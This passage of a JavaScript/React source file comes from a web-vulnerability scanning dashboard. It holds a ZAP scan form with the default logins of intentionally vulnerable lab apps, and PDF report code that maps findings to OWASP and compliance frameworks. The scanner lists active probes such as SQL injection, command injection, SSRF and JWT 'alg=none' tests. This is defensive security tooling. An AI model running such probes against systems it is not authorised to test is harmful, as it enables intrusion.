          {icon:"🧃",label:"Juice Shop",     value:"http://lab_juiceshop:3000",               desc:"🟢 Live Docker — 100+ challenges. Login: admin@juice-sh.op/admin123"},
          {icon:"🧩",label:"Mutillidae",     value:"http://lab_mutillidae",                  desc:"🟢 Live Docker — SQLi, XXE, CSRF. Login: admin/adminpass"},
          {icon:"🐛",label:"bWAPP",          value:"http://lab_bwapp/bWAPP/login.php",      desc:"🟢 Live Docker — 100+ bugs. Login: bee/bug"},
          {icon:"🌐",label:"Acunetix TestPHP",value:"http://testphp.vulnweb.com",           desc:"Public test site — safe to scan"},
        ]}/>
        <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
          <input value={target} onChange={e=>setTarget(e.target.value)}
            onKeyDown={e=>e.key==="Enter"&&run()}
            placeholder="http://target.com"
            style={{flex:3,minWidth:220,background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none"}}/>
          <select value={scanType} onChange={e=>setScanType(e.target.value)}
            style={{flex:1,minWidth:140,background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 12px",color:"#e2e8f0",fontSize:12,outline:"none"}}>
            <option value="quick">Quick Scan</option>
            <option value="full">Full Active Scan</option>
            <option value="spider">Spider Only</option>
            <option value="passive">Passive Scan</option>
          </select>
          <button onClick={run} disabled={scanning||!target.trim()}
            style={{background:scanning?"#1e293b":"linear-gradient(135deg,#7c3aed,#5b21b6)",border:"none",borderRadius:6,padding:"10px 24px",color:scanning?"#475569":"#fff",fontSize:13,fontWeight:700,cursor:scanning?"not-allowed":"pointer",whiteSpace:"nowrap"}}>
            {scanning?"Scanning...":"Run ZAP Scan"}
          </button>
        </div>
      </div>

      {/* Terminal */}
      <div style={{marginBottom:16}}><Terminal lines={lines} height={120}/></div>

      {/* Results */}
      {result && (
        <>
          {/* Summary bar */}
          <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
            {["CRITICAL","HIGH","MEDIUM","LOW","INFO"].map(s=>{
              const cnt=(result.findings||[]).filter(f=>f.severity===s).length;
              const c=sevColor(s);
              return cnt>0?(
                <div key={s} style={{background:c+"15",border:`1px solid ${c}40`,borderRadius:6,padding:"6px 14px",display:"flex",gap:8,alignItems:"center"}}>
                  <span style={{fontSize:18,fontWeight:900,color:c}}>{cnt}</span>
                  <span style={{fontSize:11,fontWeight:700,color:c}}>{s}</span>
                </div>
              ):null;
            })}
            {(result.findings||[]).length===0 && <div style={{background:"#052e16",border:"1px solid #166534",borderRadius:6,padding:"6px 14px",color:"#4ade80",fontSize:12,fontWeight:600}}>✓ No vulnerabilities found</div>}
          </div>

          {/* Findings table */}
          {(result.findings||[]).filter(f=>f.severity!=="INFO").length>0 && (
            <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
              <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                <span style={{fontSize:13,fontWeight:700,color:"#f1f5f9"}}>ZAP Findings</span>
                <span style={{fontSize:11,color:"#64748b"}}>{result.total} alert(s)</span>
              </div>
              {(result.findings||[]).filter(f=>f.severity!=="INFO").map((f,i)=>{
                const c=sevColor(f.severity);
                return (
                  <div key={i} style={{padding:"14px 16px",borderBottom:"1px solid #0f172a",borderLeft:`3px solid ${c}`}}>
                    <div style={{display:"flex",gap:8,marginBottom:6,flexWrap:"wrap",alignItems:"center"}}>
                      <span style={{background:c+"20",color:c,fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.severity}</span>
                      {f.cwe&&f.cwe!=="N/A"&&<span style={{background:"#7c3aed20",color:"#a78bfa",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.cwe}</span>}
                      <span style={{fontSize:9,color:"#64748b"}}>CVSS: {f.cvss||"N/A"}</span>
                      {f.url&&<span style={{fontSize:9,color:"#3b82f6",fontFamily:"monospace"}}>{f.url.substring(0,60)}</span>}
                    </div>
                    <div style={{fontSize:12,fontWeight:600,color:"#e2e8f0",marginBottom:4}}>{f.detail}</div>
                    {f.remediation&&<div style={{fontSize:11,color:"#4ade80",background:"#052e16",padding:"4px 8px",borderRadius:3}}>Fix: {f.remediation}</div>}
                  </div>
                );
              })}
            </div>
          )}
        </>
      )}

      {/* Install notice if ZAP not installed */}
      {!scanning && !result && (
        <div style={{background:"#1c0a00",border:"1px solid #7c2d12",borderRadius:8,padding:16,marginTop:8}}>
          <div style={{fontSize:12,fontWeight:700,color:"#fb923c",marginBottom:6}}>⚠ Install Required</div>
          <div style={{fontSize:11,color:"#94a3b8",marginBottom:8}}>If ZAP is not yet installed on your Kali VM, run:</div>
          <code style={{display:"block",background:"#020617",padding:"8px 12px",borderRadius:4,fontSize:12,color:"#4ade80",fontFamily:"monospace"}}>sudo apt install zaproxy -y</code>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  VULNERABILITY SCAN PDF REPORT
// ═══════════════════════════════════════════════════════════════
function generateVulnReport({target, allResults, date}) {
  const r = allResults || {};
  const _doGen = () => {
    const doc = new jsPDF({unit:"mm",format:"a4"});
    const pageW=210, margin=12, contentW=pageW-margin*2;
    const BLUE=[59,130,246], DARK=[15,23,42], GRAY=[100,116,139];
    const LIGHT=[241,245,249], WHITE=[255,255,255], LBLUE=[220,230,245];
    const SEV_COLOR = {CRITICAL:[220,38,38],HIGH:[234,88,12],MEDIUM:[202,138,4],LOW:[22,163,74],INFO:[100,116,139]};
    let y=18, _secN=0;

    const fillR=(x,yy,w,h,c)=>{doc.setFillColor(...c);doc.rect(x,yy,w,h,"F");};
    const rrect=(x,yy,w,h,r2,c)=>{doc.setFillColor(...c);doc.roundedRect(x,yy,w,h,r2,r2,"F");};
    const txt=(t,x,yy,sz,c,bold,align)=>{doc.setFont("Arial",bold?"bold":"normal");doc.setFontSize(sz||10);doc.setTextColor(...(c||DARK));doc.text(String(t),x,yy,{align:align||"left"});};
    const chk=n=>{if(y+n>278){doc.addPage();y=18;drawHeader();}};
    const sHead=(title,yy)=>{_secN++;fillR(margin,yy,contentW,9,LBLUE);txt(_secN+". "+title,margin+4,yy+6.2,10,BLUE,true);return yy+13;};
    const tHead=(cols,widths,yy)=>{fillR(margin,yy,contentW,8,DARK);let cx=margin+3;cols.forEach((c,i)=>{txt(c,cx,yy+5.5,8,WHITE,true);cx+=widths[i];});return yy+8;};
    const drawHeader=()=>{txt("VulnusLab — Vulnerability Scan Report",margin,10,7,GRAY);txt(date,pageW-margin,10,7,BLUE,false,"right");};

    // Cover — black banner with VulnusLab shield logo + title
    fillR(0,0,pageW,64,[0,0,0]);
    // VulnusLab shield programmatic logo (small, top-center)
    {
      const sx = pageW/2, sy = 18, w = 14, h = 16;
      doc.setFillColor(15,23,42);
      doc.setDrawColor(59,130,246); doc.setLineWidth(0.6);
      doc.lines([
        [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
        [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
        [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
      ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
      doc.setFont("helvetica","bold"); doc.setFontSize(11); doc.setTextColor(59,130,246);
      doc.text("V", sx, sy + 1, {align:"center"});
      // Wordmark
      doc.setFont("helvetica","bold"); doc.setFontSize(8);
      doc.setTextColor(241,245,249);
      doc.text("VULNUS", sx - 1, sy + 12, {align:"right"});
      doc.setTextColor(59,130,246);
      doc.text("LAB", sx, sy + 12, {align:"left"});
    }
    y=38; txt("VULNERABILITY SCAN REPORT",pageW/2,y,16,[255,255,255],true,"center"); y+=8;
    txt("Web Application Security Assessment",pageW/2,y,10,GRAY,false,"center"); y+=22;

    // Info table
    const rows=[["Target",target],["Scan Date",date],["Classification","CONFIDENTIAL"],["Report Type","Vulnerability Assessment"]];
    y=tHead(["FIELD","VALUE"],[45,135],y);
    rows.forEach(([f,v],i)=>{fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);txt(f,margin+3,y+5.5,9,GRAY,true);txt(String(v||""),margin+48,y+5.5,9,DARK);y+=8;});
    y+=10;

    // ─── TRUST-FIRST CONFIDENCE STATEMENT (Vuln module) ─────────
    chk(15);
    fillR(margin,y,contentW,12,[239,246,255]);
    fillR(margin,y,3,12,[37,99,235]);
    doc.setFont("Arial","bold"); doc.setFontSize(7.5); doc.setTextColor(37,99,235);
    doc.text("✓ VERIFIED BY VULNUSLAB",margin+6,y+5);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
    doc.text("Every finding in this report was independently triggered and re-confirmed by the VulnusLab engine.",margin+6,y+9.5);
    y += 15;

    // Tools used — Vuln-module scanner set
    const VULN_TOOLS=[
      {tool:"nikto",         label:"Nikto",            desc:"Web vulnerability scanner (6700+ checks)"},
      {tool:"nuclei",        label:"Nuclei",           desc:"Template-based scanner (13,099 templates)"},
      {tool:"wpscan",        label:"WPScan",           desc:"WordPress core / plugin / theme scanner"},
      {tool:"ssl",           label:"SSLScan",          desc:"SSL/TLS configuration analysis"},
      {tool:"headers",       label:"Security Headers", desc:"HTTP security headers (10-header check + A-F grade)"},
      {tool:"cors",          label:"CORS",             desc:"Cross-origin resource sharing misconfiguration"},
      {tool:"cookies",       label:"Cookie Security",  desc:"Cookie attribute analysis (Secure / HttpOnly / SameSite)"},
      {tool:"cms",           label:"CMS Detection",    desc:"CMS fingerprinting (WordPress / Drupal / Joomla)"},
      {tool:"xss",           label:"XSS Testing",      desc:"Reflected XSS active probe (canary + payload library)"},
      {tool:"sqli",          label:"SQL Injection",    desc:"Error-based + boolean-based + time-based SQLi"},
      {tool:"cmd_injection", label:"Cmd Injection",    desc:"OS command injection via out-of-band canary"},
      {tool:"lfi",           label:"Path Traversal",   desc:"Local file inclusion / directory traversal"},
      {tool:"open_redirect", label:"Open Redirect",    desc:"Location-header attacker-host verification"},
      {tool:"ssrf",          label:"SSRF",             desc:"Server-side request forgery (out-of-band callback)"},
      {tool:"xxe",           label:"XXE Injection",    desc:"XML external entity injection"},
      {tool:"csrf",          label:"CSRF",             desc:"Anti-CSRF token / SameSite analysis"},
      {tool:"jwt",           label:"JWT Security",     desc:"alg=none, weak-secret, kid traversal, JWKS confusion"},
      {tool:"exposed_files", label:"Exposed Files",    desc:".env / .git / backup / config file exposure"},
      {tool:"http_methods",  label:"HTTP Methods",     desc:"Dangerous HTTP verbs (TRACE / PUT / DELETE)"},
    ];
    chk(30); y=sHead("Tools Used",y);
    y=tHead(["TOOL","DESCRIPTION","FINDINGS"],[35,110,35],y);
    VULN_TOOLS.forEach((t,i)=>{
      const findings=(r[t.tool]?.findings||[]).filter(f=>f.severity!=="INFO");
      const hi=findings.filter(f=>["CRITICAL","HIGH"].includes(f.severity)).length;
      fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      txt(t.label,margin+3,y+5,8.5,BLUE,true);
      txt(t.desc,margin+38,y+5,8.5,DARK);
      const fc=hi>0?[220,38,38]:findings.length>0?[202,138,4]:[22,163,74];
      txt(r[t.tool]?String(findings.length)+" found":"not run",margin+145,y+5,8,fc,true);
      y+=7;
    });
    y+=8;

    // Summary
    const allFindings=VULN_TOOLS.flatMap(t=>(r[t.tool]?.findings||[]).filter(f=>f.severity!=="INFO").map(f=>({...f,source:t.label,_tool:t.tool})));
    const sevCount={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
    allFindings.forEach(f=>{if(sevCount[f.severity]!==undefined)sevCount[f.severity]++;});

    // ─── RISK HEADLINE CALLOUT ─────────────────────────────────
    // Sits above the count grid — same pattern as WebApp PDF.
    chk(28);
    const _critN = sevCount.CRITICAL, _highN = sevCount.HIGH, _medN = sevCount.MEDIUM, _lowN = sevCount.LOW;
    const _topF = allFindings.find(f=>f.severity==="CRITICAL") || allFindings.find(f=>f.severity==="HIGH") || allFindings.find(f=>f.severity==="MEDIUM") || null;
    let _hlBgColor=[240,253,244], _hlAccent=[15,118,82], _hlTag="POSTURE OK", _hlTitle="No critical issues found", _hlSub="Vulnerability scan completed — no actionable findings. Review LOW findings for hardening.";
    if (_critN > 0)      { _hlBgColor=[254,242,242]; _hlAccent=[162,28,28];  _hlTag="FIX IMMEDIATELY"; _hlTitle=`${_critN} CRITICAL finding(s) — patch within 24 hours`; _hlSub=_topF ? String(_topF.detail||"").substring(0,160) : "See Per-Tool Findings."; }
    else if (_highN > 0) { _hlBgColor=[255,247,237]; _hlAccent=[133,79,11];  _hlTag="FIX THIS WEEK";   _hlTitle=`${_highN} HIGH finding(s) — patch within 7 days`;     _hlSub=_topF ? String(_topF.detail||"").substring(0,160) : "See Per-Tool Findings."; }
    else if (_medN > 0)  { _hlBgColor=[254,252,232]; _hlAccent=[120,89,15];  _hlTag="HARDENING";       _hlTitle=`${_medN} MEDIUM finding(s) — hardening recommended`;  _hlSub=_topF ? String(_topF.detail||"").substring(0,160) : "Review per the severity table below."; }
    fillR(margin,y,contentW,24,_hlBgColor);
    fillR(margin,y,3,24,_hlAccent);
    doc.setFont("Arial","bold"); doc.setFontSize(7.5); doc.setTextColor(..._hlAccent);
    doc.text(_hlTag,margin+6,y+6);
    doc.setFont("Arial","bold"); doc.setFontSize(11); doc.setTextColor(...DARK);
    doc.text(_hlTitle,margin+6,y+13);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
    const _subLines = doc.splitTextToSize(String(_hlSub||""), contentW-10);
    _subLines.slice(0,2).forEach((ln,i)=>doc.text(ln,margin+6,y+18+i*3.6));
    y += 28;

    chk(35); y=sHead("Findings Summary",y);
    const sc=[["CRITICAL",sevCount.CRITICAL,[220,38,38]],["HIGH",sevCount.HIGH,[234,88,12]],["MEDIUM",sevCount.MEDIUM,[202,138,4]],["LOW",sevCount.LOW,[22,163,74]]];
    sc.forEach(([sev,cnt,col],i)=>{
      fillR(margin+i*46,y,44,20,LIGHT); rrect(margin+i*46+2,y+2,40,6,1,col);
      txt(sev,margin+i*46+22,y+6.5,7,WHITE,true,"center");
      txt(String(cnt),margin+i*46+22,y+15,12,col,true,"center");
      y+=0;
    });
    y+=28;

    // ─── OWASP TOP 10 — 2021 COVERAGE SCORECARD ─────
    const _OWASP_2021 = [
      ["A01","Broken Access Control"],["A02","Cryptographic Failures"],
      ["A03","Injection"],["A04","Insecure Design"],
      ["A05","Security Misconfiguration"],["A06","Vulnerable & Outdated Components"],
      ["A07","Identification & Authentication Failures"],["A08","Software & Data Integrity Failures"],
      ["A09","Security Logging & Monitoring Failures"],["A10","Server-Side Request Forgery"]
    ];
    const _owaspMap = {};
    _OWASP_2021.forEach(([code]) => _owaspMap[code] = []);
    (allFindings || []).forEach(f => {
      const tag = String(f.owasp || "").toUpperCase();
      const m = tag.match(/A(\d{1,2})/);
      if (!m) return;
      const code = "A" + m[1].padStart(2, "0");
      if (_owaspMap[code]) _owaspMap[code].push(f);
    });
    const _failCats = _OWASP_2021.filter(([c]) => _owaspMap[c].length > 0).length;
    const _passCats = 10 - _failCats;
    const _owaspGrade = _passCats >= 9 ? "A" : _passCats >= 7 ? "B" : _passCats >= 5 ? "C" : _passCats >= 3 ? "D" : "F";
    const _gradeColor = _owaspGrade === "A" ? [15,118,82] : _owaspGrade === "B" ? [22,163,74] :
                        _owaspGrade === "C" ? [202,138,4] : _owaspGrade === "D" ? [194,65,12] : [162,28,28];
    chk(95); y += 2;
    y = sHead("OWASP Top 10 — 2021 Coverage", y);
    fillR(margin, y, contentW, 16, LIGHT);
    fillR(margin, y, 4, 16, _gradeColor);
    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(..._gradeColor);
    doc.text(_owaspGrade, margin+10, y+11);
    doc.setFont("Arial","bold"); doc.setFontSize(12); doc.setTextColor(...DARK);
    doc.text(`${_passCats}/10 OWASP categories passing`, margin+28, y+7);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
    doc.text(_failCats === 0 ? "All 10 categories clear — strong security posture." : `${_failCats} category(ies) failing — prioritize fixes below.`, margin+28, y+12);
    y += 19;
    y = tHead(["CATEGORY","NAME","STATUS","BREAKDOWN"],[20,82,22,56],y);
    _OWASP_2021.forEach(([code, name], i) => {
      const matches = _owaspMap[code];
      const passing = matches.length === 0;
      chk(9);
      fillR(margin, y, contentW, 8, i%2===0 ? LIGHT : WHITE);
      fillR(margin, y, 1.5, 8, passing ? [15,118,82] : [162,28,28]);
      doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
      doc.text(code+":2021", margin+4, y+5.5);
      doc.setFont("Arial","normal"); doc.setFontSize(8);
      doc.text(name, margin+24, y+5.5);
      const stBg = passing ? [220,252,231] : [254,226,226];
      const stFg = passing ? [15,118,82] : [162,28,28];
      rrect(margin+106, y+1.5, 18, 5, 1, stBg);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...stFg);
      doc.text(passing ? "PASS" : "FAIL", margin+(passing?112:111.5), y+5);
      if (passing) {
        doc.setFont("Arial","italic"); doc.setFontSize(7.5); doc.setTextColor(15,118,82);
        doc.text("No findings in this category", margin+128, y+5.5);
      } else {
        const _sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
        matches.forEach(f => { if (_sc[f.severity] !== undefined) _sc[f.severity]++; });
        const parts = ["CRITICAL","HIGH","MEDIUM","LOW"].filter(s => _sc[s] > 0).map(s => `${_sc[s]} ${s}`);
        doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
        doc.text(parts.join(" · ") || `${matches.length} finding(s)`, margin+128, y+5.5);
      }
      y += 8;
    });
    y += 5;

    // ─── COMPLIANCE COVERAGE — 8 frameworks ─────
    const _CWE_TO_COMPLIANCE_V = {
      "CWE-79":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10",       "164.312(a)(1)",     "Art. 32 / 25",   "PR.IP-2 / DE.CM-4", "CIS 16.10"],
      "CWE-89":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)",     "Art. 32 / 25",   "PR.DS-5 / PR.IP-2", "CIS 16.10 / 16.4"],
      "CWE-94":   ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-352":  ["6.2.4",        "CC6.1","A.5.15","SC-23",       "164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-1021": ["6.4.3",        "CC6.6","A.8.23","SC-7",        "164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-200":  ["3.4.1",        "CC6.1","A.5.10","SC-8 / AC-3", "164.312(e)(1)",     "Art. 32 / 33",   "PR.DS-1 / PR.DS-2", "CIS 3.3 / 16.10"],
      "CWE-319":  ["4.2.1",        "CC6.7","A.8.24","SC-8 / SC-13","164.312(e)(1)",     "Art. 32",        "PR.DS-2",           "CIS 3.10 / 13.6"],
      "CWE-942":  ["6.2.4 / 6.4.1","CC6.6","A.8.23","SC-7 / AC-3", "164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-639":  ["7.2 / 8.2.5",  "CC6.1","A.5.15","AC-3 / AC-6", "164.312(a)(1)",     "Art. 32 / 25",   "PR.AC-4",           "CIS 16.8"],
      "CWE-538":  ["2.2.7 / 6.4.1","CC6.1","A.5.10","AC-3 / AC-6", "164.312(a)(1)",     "Art. 32 / 25",   "PR.DS-1 / PR.AC-4", "CIS 3.7 / 13.6"],
      "CWE-693":  ["6.2.4",        "CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)",     "Art. 32",        "PR.IP-1",           "CIS 16.10"],
      "CWE-1004": ["8.3.10",       "CC6.7","A.8.5", "SC-23 / IA-2","164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-614":  ["4.2.1 / 8.3.10","CC6.7","A.8.5","SC-8 / SC-23","164.312(e)(1)",    "Art. 32",        "PR.DS-2",           "CIS 3.10 / 16.5"],
      "CWE-601":  ["6.2.4",        "CC6.6","A.8.21","SI-10 / SC-7","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-918":  ["6.2.4",        "CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-611":  ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-78":   ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-22":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)",     "Art. 32 / 25",   "PR.AC-4 / PR.IP-2", "CIS 16.10 / 3.7"],
      "CWE-434":  ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-287":  ["7.2 / 8.2",    "CC6.1","A.5.15","IA-2 / AC-7", "164.312(d)",        "Art. 32 / 25",   "PR.AC-1 / PR.AC-7", "CIS 6.3 / 16.3"],
      "CWE-1275": ["8.3.10",       "CC6.7","A.8.5", "SC-23",       "164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-16":   ["2.2.4",        "CC6.6","A.8.9", "CM-6 / CM-7", "164.308(a)(1)",     "Art. 32 / 25",   "PR.IP-1",           "CIS 4.1 / 4.2"],
      "CWE-1395": ["6.3.3 / 6.5.6","CC7.1","A.8.8", "SI-2 / RA-5", "164.308(a)(5)",     "Art. 32",        "ID.RA-1 / PR.IP-12","CIS 7.1 / 7.3"],
    };
    const _FW_V = [
      {n:"PCI-DSS v4.0",             b:"Payment Card Industry — Req 6/8"},
      {n:"SOC 2 (Trust Services)",   b:"AICPA Common Criteria — CC6"},
      {n:"ISO 27001:2022",           b:"Annex A.5/8/14 (Org, People, Tech)"},
      {n:"NIST 800-53 Rev 5",        b:"US federal controls — SI/SC/AC/IA"},
      {n:"HIPAA Security Rule",      b:"45 CFR 164.308/312"},
      {n:"GDPR",                     b:"Art. 32 (security), 25 (by-design), 33"},
      {n:"NIST CSF 2.0",             b:"IDENTIFY/PROTECT/DETECT/RESPOND"},
      {n:"CIS Controls v8",          b:"18 critical controls"},
    ];
    const _SEV_BG_V = {CRITICAL:[254,226,226],HIGH:[255,237,213],MEDIUM:[254,252,232],LOW:[220,252,231]};
    const _SEV_TX_V = {CRITICAL:[162,28,28],HIGH:[194,65,12],MEDIUM:[133,79,11],LOW:[15,118,82]};
    const _sevRank_V = {CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3,INFO:4};
    const _fwMaps = _FW_V.map(() => new Map());
    const _pushC = (m, ctrl, f) => {
      if (!ctrl) return;
      ctrl.split(/\s*\/\s*/).forEach(c => { if (!m.has(c)) m.set(c, []); m.get(c).push(f); });
    };
    (allFindings || []).forEach(f => {
      const cwe = String(f.cwe || "").trim().toUpperCase();
      const map = _CWE_TO_COMPLIANCE_V[cwe];
      if (!map) return;
      _FW_V.forEach((fw, i) => _pushC(_fwMaps[i], map[i], f));
    });
    if (_fwMaps.some(m => m.size > 0)) {
      chk(70); y += 2;
      y = sHead("Compliance Coverage — 8 Frameworks", y);
      doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      doc.text("Findings mapped onto PCI-DSS, SOC 2, ISO 27001, NIST 800-53, HIPAA, GDPR, NIST CSF, CIS v8.", margin+2, y);
      doc.setFont("Arial","normal");
      y += 4;
      const _renderFwV = (name, blurb, controlsMap) => {
        if (controlsMap.size === 0) return;
        chk(controlsMap.size * 7 + 14);
        fillR(margin, y, contentW, 7, [30,64,175]);
        doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(...WHITE);
        doc.text(name, margin+3, y+5);
        doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(218,234,254);
        doc.text(blurb, margin+62, y+5);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...WHITE);
        doc.text(`${controlsMap.size} control(s) impacted`, pageW-margin-3, y+5, {align:"right"});
        y += 7;
        Array.from(controlsMap.entries()).sort((a,b)=>b[1].length - a[1].length).forEach(([ctrl, fs], i) => {
          chk(7);
          fillR(margin, y, contentW, 6.5, i%2===0 ? LIGHT : WHITE);
          fillR(margin, y, 1.5, 6.5, [162,28,28]);
          doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...DARK);
          doc.text(ctrl, margin+4, y+4.5);
          const sortedFs = [...fs].sort((a,b) => (_sevRank_V[a.severity]??9) - (_sevRank_V[b.severity]??9));
          const worst = sortedFs[0].severity || "LOW";
          rrect(margin+50, y+1.5, 18, 5, 1, _SEV_BG_V[worst] || _SEV_BG_V.LOW);
          doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...(_SEV_TX_V[worst] || _SEV_TX_V.LOW));
          doc.text(worst, margin+51, y+5);
          const uniqueTitles = [...new Set(sortedFs.map(f => (f.detail || "").trim()))].filter(Boolean);
          const sample = uniqueTitles.length === 1 ? uniqueTitles[0].substring(0, 80) : `${uniqueTitles[0].substring(0, 60)} (+${uniqueTitles.length-1} more)`;
          doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
          doc.text(`${fs.length} finding(s): ${sample}`, margin+72, y+4.5);
          y += 6.5;
        });
        y += 4;
      };
      _FW_V.forEach((fw, i) => _renderFwV(fw.n, fw.b, _fwMaps[i]));
    }

    // ─── SCAN COVERAGE (Trust-First: every tool accounted for) ──
    // Five states: RAN (has data) / EMPTY (ran, no findings) / FAILED
    // (errored) / NOT RUN (tile deselected). No silent skipping.
    chk(60); y = sHead("Scan Coverage", y);
    const _covRows = VULN_TOOLS.map(t => {
      const d = r[t.tool];
      if (!d) return {tool:t.label, status:"NOT RUN",  detail:"Phase tile was deselected before this scan"};
      if (d.error || d.ok === false) return {tool:t.label, status:"FAILED", detail:String(d.error||d.suggested_action||"unknown error").substring(0,90)};
      if (d.skipped_reason) return {tool:t.label, status:"SKIPPED", detail:String(d.skipped_reason).substring(0,90)};
      const findings = (d.findings||[]).filter(f=>f.severity!=="INFO");
      if (findings.length === 0) return {tool:t.label, status:"EMPTY", detail:"Ran cleanly — no vulnerabilities detected"};
      return {tool:t.label, status:"RAN", detail:`${findings.length} finding(s) reported`};
    });
    const _cnt = (s)=>_covRows.filter(p=>p.status===s).length;
    const _ran=_cnt("RAN"), _empty=_cnt("EMPTY"), _failed=_cnt("FAILED"), _notrun=_cnt("NOT RUN"), _skipped=_cnt("SKIPPED");
    const _completeness = VULN_TOOLS.length - _notrun - _failed;
    const _covPct = Math.round(_completeness / VULN_TOOLS.length * 100);
    const _covColor = _covPct >= 90 ? [15,118,82] : _covPct >= 70 ? [202,138,4] : [162,28,28];
    fillR(margin, y, contentW, 16, LIGHT);
    fillR(margin, y, 4, 16, _covColor);
    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(..._covColor);
    doc.text(`${_covPct}%`, margin+10, y+11);
    doc.setFont("Arial","bold"); doc.setFontSize(11); doc.setTextColor(...DARK);
    doc.text(`${_completeness}/${VULN_TOOLS.length} tools completed cleanly`, margin+30, y+7);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
    doc.text(`${_ran} ran with data · ${_empty} empty · ${_failed} failed · ${_skipped} skipped · ${_notrun} not selected`, margin+30, y+12);
    y += 19;
    y = tHead(["TOOL","STATUS","DETAIL"],[55,25,100],y);
    _covRows.forEach((p,i)=>{
      const stColor = p.status==="RAN" ? [15,118,82] : p.status==="EMPTY" ? [55,65,81] : p.status==="FAILED" ? [162,28,28] : p.status==="SKIPPED" ? [120,53,15] : [100,116,139];
      const stBg    = p.status==="RAN" ? [220,252,231]:p.status==="EMPTY" ? [241,245,249]:p.status==="FAILED" ? [254,226,226]:p.status==="SKIPPED" ? [254,243,199]:[226,232,240];
      chk(7); fillR(margin, y, contentW, 6.5, i%2===0?LIGHT:WHITE);
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
      doc.text(p.tool, margin+3, y+4.8);
      rrect(margin+58, y+1.5, 22, 5, 1, stBg);
      doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...stColor);
      doc.text(p.status, margin+59.5, y+5);
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
      doc.text(String(p.detail||"").substring(0,95), margin+84, y+4.8);
      y += 6.5;
    });
    y += 6;

    // Per-tool findings sections
    VULN_TOOLS.forEach(t=>{
      const findings=(r[t.tool]?.findings||[]).filter(f=>f.severity!=="INFO");
      if(!r[t.tool]) return;
      chk(30); y=sHead(t.label+" — Findings",y);
      if(findings.length===0){
        fillR(margin,y,contentW,8,LIGHT);txt("No significant findings detected.",margin+4,y+5.5,8.5,GRAY);y+=12;
      } else {
        y=tHead(["SEV","FINDING","CVSS","CWE / OWASP","REMEDIATION"],[16,76,14,30,50],y);
        const SEV_ABBR={CRITICAL:"CRIT",HIGH:"HIGH",MEDIUM:"MED",LOW:"LOW",INFO:"INFO"};
        const filteredFindings = findings.filter(f => !String(f.detail||"").toLowerCase().includes("no cgi dir") && !String(f.detail||"").toLowerCase().includes("cgi tests skipped"));
        filteredFindings.forEach((f,i)=>{
